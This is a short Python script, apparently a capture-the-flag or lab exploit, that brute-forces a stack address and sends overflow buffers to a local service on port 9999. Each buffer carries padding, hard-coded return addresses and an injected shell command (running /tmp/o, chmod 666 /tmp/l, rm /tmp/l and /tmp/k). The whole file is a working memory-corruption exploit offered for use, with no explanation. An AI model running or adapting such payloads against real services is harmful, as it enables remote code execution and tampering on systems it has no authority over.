import time
import socket
import struct
import os.path
import binascii


HOST = "localhost"
PORT = 9999
LEN = 1024

i = struct.unpack("I","\x80\xec\xff\xff")[0]

for j in range(0,1000):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))

    print(binascii.hexlify(struct.pack("I",i+j)))
    s.send(" "*119+"/tmp/o;"+" "*10+"\x80\x1e\xe9\xf7\x50\x4c\xe8\xf7"+struct.pack("I",i+j))

    time.sleep(0.1)
    if os.path.isfile("/tmp/l"):
        print("Nice found !")
        break

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

print(binascii.hexlify(struct.pack("I",i+j)))
s.send(" "*109+"chmod 666 /tmp/l;"+" "*10+"\x80\x1e\xe9\xf7\x50\x4c\xe8\xf7"+struct.pack("I",i+j))


i = struct.unpack("I","\x90\xec\xff\xff")[0]
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send(" "*109+"rm /tmp/l;"+" "*17+"\x80\x1e\xe9\xf7\x50\x4c\xe8\xf7"+struct.pack("I",i))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send(" "*109+"rm /tmp/k;"+" "*17+"\x80\x1e\xe9\xf7\x50\x4c\xe8\xf7"+struct.pack("I",i))
